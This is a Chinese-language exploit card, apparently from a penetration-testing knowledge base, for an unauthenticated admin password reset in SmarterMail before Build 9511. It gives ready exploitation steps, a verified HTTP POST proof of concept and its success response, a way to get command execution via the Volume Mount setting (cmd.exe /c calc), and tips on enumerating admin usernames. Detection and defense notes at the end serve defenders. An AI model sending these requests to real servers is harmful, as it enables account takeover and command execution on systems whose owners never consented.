---
id: web-generic-auth-smartermail-force-reset-password-anonymous-admin
title: SmarterMail force-reset-password 匿名接口 IsSysAdmin 分支跳过旧密码校验：重置管理员密码进后台命令执行
type: scenario
domain: web
path: web/generic/auth
technique: anonymous-password-reset-sysadmin-branch
tags:
- web
- auth
- auth-bypass
- password-reset
- parameter-tampering
- smartermail
- account-takeover
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < Build 9511
verification:
  verified_by: verifier-V59
  verified_at: '2026-11-05T08:47:11+08:00'
  notes: 已对照原文与5张图核对：图03匿名POST /api/v1/auth/force-reset-password（IsSysAdmin=true，OldPassword任意）返回200 success:true；图04登录后Volume Mount填cmd.exe /c calc；图05 Build 9511返回400 Invalid input parameters。原文明确< Build 9511，affected_versions已存在且相符。未验证点：未本机复跑PoC；命令以服务权限执行属合理推断；原文无CVE；frontmatter无sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-smartermail-force-reset-password-anonymous-admin/
draft: false
kb_aliases:
- SmarterMail 身份认证绕过
- SmarterMail force-reset-password
- SmarterMail 管理员密码重置
- IsSysAdmin 参数绕过
- SmarterMail 未授权 RCE
---

## 一句话结论

SmarterMail 的 `/api/v1/auth/force-reset-password` 被标记为匿名可访问（`AllowAnonymous`），其请求体中的 `IsSysAdmin` 布尔值直接决定服务端走“系统管理员重置”分支；该分支不校验 `OldPassword` 就更新管理员密码，攻击者无需任何凭据即可把 `admin` 密码改成任意值，登录后台后再利用内置的 Volume Mount 命令执行功能拿到系统命令执行权限。

## 原理

- 控制器方法 `ForceResetPassword` 调用 `AuthenticationService.Instance.ForcePasswordReset(inputs, clientIp)`，输入模型 `ForceResetPasswordInputs` 由 ASP.NET Core 从 HTTP POST 的 JSON body 做模型绑定，字段包括 `IsSysAdmin`、`Username`、`OldPassword`、`NewPassword`、`ConfirmPassword`，全部由客户端控制。
- 接口本意支持“管理员帮助用户重置密码”等场景，因此被注册为匿名可访问；但它没有把匿名调用与管理员调用区分开。
- `ForcePasswordReset` 内部按 `inputs.IsSysAdmin` 分支：为 `true` 时走系统管理员路径，通过 `SystemRepository.Instance.AdministratorGetByUsername(inputs.Username)` 取管理员记录、做密码强度校验，然后直接构造更新实体并调用 `SystemRepository.Instance.AdministratorUpdate(...)` 更新 `password_hash` 与密码历史；整条管理员路径**没有比对 `inputs.OldPassword`**。
- 普通用户路径才有旧密码验证，所以攻击者只要把 `IsSysAdmin` 传成真，就能跳过旧密码这一唯一校验，实现任意管理员密码重置。漏洞成立的根本原因是“安全分支选择标记由未认证请求体提供”，且该分支缺失身份认证与旧密码校验。

## 触发条件

- 目标为 SmarterMail `< Build 9511`（Build 9511 起该请求返回 400 `Invalid input parameters`，利用失败）。
- 目标开放 Web 管理/API 端口，`/api/v1/auth/force-reset-password` 可未认证访问。
- 攻击者知道管理员用户名（默认或常见为 `admin`，也可从登录页/报错枚举）。
- 新密码满足目标管理员账户的密码强度要求。

## 利用步骤

1. 确认目标版本低于 Build 9511，并访问 `/api/v1/auth/force-reset-password` 确认接口存在。
2. 发送 JSON POST，`IsSysAdmin` 为 `true`，`Username` 填管理员用户名，`OldPassword` 填任意值，`NewPassword` 与 `ConfirmPassword` 一致且满足强度要求。
3. 观察响应：`HTTP 200` 且 body 中 `success: true`、`resultCode: 200` 表示密码已被重置。
4. 用 `admin` 与新密码登录 Web 后台。
5. 进入 `Settings -> Volume Mounts`，新增 Volume Mount，在 `Volume Mount Command` 中填入系统命令（如 `cmd.exe /c calc`）并保存，命令以 SmarterMail 服务权限执行；也可使用后台其他内置管理功能扩展。
6. 验证命令执行结果后停止，避免修改生产数据。

## PoC

最小请求：

```http
POST /api/v1/auth/force-reset-password HTTP/1.1
Host: target:9998
Content-Type: application/json
Content-Length: 145

{"IsSysAdmin":"true",
"OldPassword":"watever",
"Username":"admin",
"NewPassword":"Abc123456!",
"ConfirmPassword": "Abc123456!"}
```

成功响应特征：

```json
{"username":"","errorCode":"","errorData":"","debugInfo":"","success":true,"resultCode":200}
```

随后登录后台，在 Volume Mount 中执行 `cmd.exe /c calc` 验证命令执行。

## 变体与关联

- 变体：`IsSysAdmin` 以字符串 `"true"` 传入同样被模型绑定转换为布尔真；若目标只接受严格 JSON 布尔，可改用 `true`。
- 变体：`Username` 换成其他系统管理员账户名；若默认 `admin` 被改名，可先通过登录响应差异或密码重置提示枚举管理员用户名。
- 变体：重置成功后不一定需要 Volume Mount，后台其他管理功能（计划任务、邮件规则外发、API 密钥等）也可作为后续利用面。
- 关联：[[web-generic-auth-password-reset-username-tampering]]（客户端可控 username 导致任意用户重置，本卡是“客户端可控权限分支标记”的同类根因）。
- 关联：[[web-generic-auth-authenticated-change-password-idor]]（改密接口缺少身份/旧密码校验的另一实现）。
- 关联：[[web-dotnet-smartermail-connect-to-hub-mount-command-rce]]（同一版本区间 `< Build 9511` 的另一条匿名管理接口 RCE；本卡需先重置管理员密码，该卡无需凭据直接命令执行，二者可区分场景）。

## 检测与防御

- 防御：升级到 SmarterMail Build 9511 及以上。
- 防御：不要把 `AllowAnonymous` 用在可修改凭据的接口上；密码重置接口必须要求已认证管理员会话或一次性重置 token。
- 防御：权限分支（是否管理员）必须由服务端会话/角色判定，禁止从请求体读取 `IsSysAdmin` 之类标记；管理员重置路径同样要校验旧密码或二次认证。
- 检测：未认证来源对 `/api/v1/auth/force-reset-password` 的 POST；同一 IP 短时间内重置多个管理员；请求体中 `IsSysAdmin` 为真但无会话；重置后立即出现管理员登录及 Volume Mount 配置变更。
- 检测：Volume Mount 命令字段出现 `cmd.exe`、`powershell`、`/c`、`bash -c` 等命令解释器特征。
